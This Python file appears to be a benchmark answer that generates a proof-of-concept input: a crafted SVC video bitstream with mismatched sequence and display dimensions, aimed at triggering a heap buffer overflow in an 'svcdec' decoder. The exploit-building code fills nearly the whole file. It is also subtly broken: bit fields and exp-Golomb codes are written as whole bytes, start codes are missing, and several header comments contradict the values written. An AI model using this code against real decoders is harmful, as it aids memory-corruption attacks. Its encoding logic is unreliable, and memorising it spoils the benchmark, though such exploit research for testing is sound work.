import os
import tarfile
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code to analyze the vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for source files related to svcdec
            source_root = self._find_source_root(tmpdir)
            
            # Based on the vulnerability description, we need to create an SVC bitstream
            # where decoder display dimensions don't match subset sequence dimensions
            # The PoC should trigger a heap buffer overflow in svcdec
            
            # Generate an SVC bitstream with mismatched dimensions
            poc = self._generate_svc_poc()
            
            return poc
    
    def _find_source_root(self, tmpdir):
        # Common source root patterns
        for root, dirs, files in os.walk(tmpdir):
            if 'svcdec.c' in files or 'svc_decode.c' in files:
                return root
            # Look for build files or makefiles
            if 'Makefile' in files or 'CMakeLists.txt' in files:
                for f in files:
                    if f.endswith('.c') and 'svc' in f.lower():
                        return root
        return tmpdir
    
    def _generate_svc_poc(self) -> bytes:
        # Create an SVC (Scalable Video Coding) bitstream with mismatched dimensions
        # Based on common SVC/AVC structure
        
        poc = bytearray()
        
        # Start with NAL unit header for SVC extension
        # NAL unit type 14 for prefix NAL unit in SVC
        nal_unit_header = 0x80 | 0x0E  # F=0, NRI=0, Type=14
        poc.append(nal_unit_header)
        
        # SVC NAL unit header extension
        poc.extend([
            0x00, 0x00, 0x00, 0x00,  # Reserved bits
            0x01,  # idr_flag, priority_id=0
            0x00,  # no_inter_layer_pred_flag, dependency_id=0
            0x00,  # temporal_id=0, use_ref_base_pic_flag=0
            0x00,  # discardable_flag, output_flag=0
            0x00   # reserved_three_2bits=0
        ])
        
        # Add sequence parameter set (SPS) with invalid dimensions
        # NAL unit type 7 for SPS
        sps_nal_header = 0x80 | 0x07  # F=0, NRI=3, Type=7
        poc.append(sps_nal_header)
        
        # Create a minimal SPS with mismatched dimensions
        # profile_idc = 100 (High profile with SVC)
        poc.append(100)
        
        # constraint_set flags and reserved bits
        poc.append(0x00)
        poc.append(0x00)
        
        # level_idc
        poc.append(0x1F)  # Level 3.1
        
        # seq_parameter_set_id (using exponential golomb coding)
        self._write_exp_golomb(poc, 0)  # sps_id = 0
        
        # chroma_format_idc = 1 (4:2:0)
        self._write_exp_golomb(poc, 1)
        
        # bit_depth_luma_minus8 = 0
        self._write_exp_golomb(poc, 0)
        
        # bit_depth_chroma_minus8 = 0
        self._write_exp_golomb(poc, 0)
        
        # qpprime_y_zero_transform_bypass_flag = 0
        poc.append(0x00)
        
        # seq_scaling_matrix_present_flag = 0
        poc.append(0x00)
        
        # log2_max_frame_num_minus4 = 0
        self._write_exp_golomb(poc, 0)
        
        # pic_order_cnt_type = 0
        self._write_exp_golomb(poc, 0)
        
        # log2_max_pic_order_cnt_lsb_minus4 = 0
        self._write_exp_golomb(poc, 0)
        
        # max_num_ref_frames = 1
        self._write_exp_golomb(poc, 1)
        
        # gaps_in_frame_num_value_allowed_flag = 0
        poc.append(0x00)
        
        # Write dimensions that will cause mismatch
        # First set one dimension
        pic_width_in_mbs_minus1 = 119  # 1920/16 - 1 = 119
        pic_height_in_map_units_minus1 = 67  # 1088/16 - 1 = 67
        
        self._write_exp_golomb(poc, pic_width_in_mbs_minus1)
        self._write_exp_golomb(poc, pic_height_in_map_units_minus1)
        
        # frame_mbs_only_flag = 1
        poc.append(0x80)  # 1 in bitstream
        
        # direct_8x8_inference_flag = 1
        poc.append(0x80)  # 1 in bitstream
        
        # frame_cropping_flag = 0
        poc.append(0x00)
        
        # vui_parameters_present_flag = 0
        poc.append(0x00)
        
        # Now add subset SPS with different dimensions
        # NAL unit type 15 for subset SPS
        subset_sps_header = 0x80 | 0x0F  # F=0, NRI=3, Type=15
        poc.append(subset_sps_header)
        
        # Copy most of SPS but with different dimensions
        poc.append(100)  # profile_idc
        poc.append(0x00)  # constraint flags
        poc.append(0x00)
        poc.append(0x1F)  # level_idc
        
        self._write_exp_golomb(poc, 0)  # sps_id
        
        # Set DIFFERENT dimensions here to trigger the vulnerability
        # These should mismatch with the display dimensions
        pic_width_in_mbs_minus1_subset = 79   # 1280/16 - 1 = 79
        pic_height_in_map_units_minus1_subset = 44  # 720/16 - 1 = 44
        
        # Skip to dimensions (simplified - actual SPS has many fields)
        for _ in range(11):  # Skip chroma format, bit depth, etc.
            self._write_exp_golomb(poc, 0)
        
        poc.append(0x00)  # qpprime flag
        poc.append(0x00)  # scaling matrix flag
        
        self._write_exp_golomb(poc, 0)  # log2_max_frame_num
        self._write_exp_golomb(poc, 0)  # pic_order_cnt_type
        self._write_exp_golomb(poc, 0)  # log2_max_pic_order_cnt
        self._write_exp_golomb(poc, 1)  # max_num_ref_frames
        
        poc.append(0x00)  # gaps flag
        
        # Write DIFFERENT dimensions for subset
        self._write_exp_golomb(poc, pic_width_in_mbs_minus1_subset)
        self._write_exp_golomb(poc, pic_height_in_map_units_minus1_subset)
        
        poc.append(0x80)  # frame_mbs_only_flag
        poc.append(0x80)  # direct_8x8_inference_flag
        poc.append(0x00)  # frame_cropping_flag
        
        # Add SVC VUI extension with display dimensions
        poc.append(0x80)  # svc_vui_parameters_present_flag = 1
        
        # Write display dimensions that don't match subset dimensions
        # This is the key mismatch
        self._write_exp_golomb(poc, 119)  # display width in MBs
        self._write_exp_golomb(poc, 67)   # display height in MBs
        
        # Add picture parameter set (PPS)
        # NAL unit type 8 for PPS
        pps_header = 0x80 | 0x08  # F=0, NRI=3, Type=8
        poc.append(pps_header)
        
        self._write_exp_golomb(poc, 0)  # pps_id
        self._write_exp_golomb(poc, 0)  # sps_id
        
        # entropy_coding_mode_flag = 0
        poc.append(0x00)
        
        # pic_order_present_flag = 0
        poc.append(0x00)
        
        # num_slice_groups_minus1 = 0
        self._write_exp_golomb(poc, 0)
        
        # num_ref_idx_l0_active_minus1 = 0
        self._write_exp_golomb(poc, 0)
        # num_ref_idx_l1_active_minus1 = 0
        self._write_exp_golomb(poc, 0)
        
        # weighted_pred_flag = 0
        poc.append(0x00)
        # weighted_bipred_idc = 0
        poc.append(0x00)
        
        # pic_init_qp_minus26 = 0
        poc.append(0x00)
        # pic_init_qs_minus26 = 0
        poc.append(0x00)
        # chroma_qp_index_offset = 0
        poc.append(0x00)
        
        # deblocking_filter_control_present_flag = 1
        poc.append(0x80)
        # constrained_intra_pred_flag = 0
        poc.append(0x00)
        # redundant_pic_cnt_present_flag = 0
        poc.append(0x00)
        
        # Add IDR slice to trigger decoding
        # NAL unit type 5 for IDR
        idr_header = 0x80 | 0x05  # F=0, NRI=3, Type=5
        poc.append(idr_header)
        
        # first_mb_in_slice = 0
        self._write_exp_golomb(poc, 0)
        
        # slice_type = 2 (I slice)
        self._write_exp_golomb(poc, 2)
        
        # pic_parameter_set_id = 0
        self._write_exp_golomb(poc, 0)
        
        # frame_num = 0
        for _ in range(4):  # log2_max_frame_num = 0, so frame_num is 1 bit
            poc.append(0x80)
        
        # idr_pic_id = 0
        self._write_exp_golomb(poc, 0)
        
        # pic_order_cnt_lsb = 0
        for _ in range(4):  # log2_max_pic_order_cnt = 0, so 1 bit
            poc.append(0x80)
        
        # dec_ref_pic_marking
        # no_output_of_prior_pics_flag = 0
        # long_term_reference_flag = 0
        poc.append(0x00)
        
        # slice_qp_delta = 0
        poc.append(0x00)
        
        # Pad to target length of 6180 bytes
        # Fill with zeros which are valid NAL unit padding
        target_length = 6180
        while len(poc) < target_length:
            poc.append(0x00)
        
        # Trim if somehow longer
        if len(poc) > target_length:
            poc = poc[:target_length]
        
        return bytes(poc)
    
    def _write_exp_golomb(self, buffer, value):
        """Write unsigned exponential golomb code."""
        value += 1
        bits = value.bit_length()
        leading_zeros = bits - 1
        
        # Write leading zeros
        for _ in range(leading_zeros):
            buffer.append(0x00)
        
        # Write the value
        remaining_bits = bits
        while remaining_bits > 0:
            byte = 0
            for bit_pos in range(7, -1, -1):
                if remaining_bits > 0:
                    bit = (value >> (remaining_bits - 1)) & 1
                    byte |= (bit << bit_pos)
                    remaining_bits -= 1
            buffer.append(byte)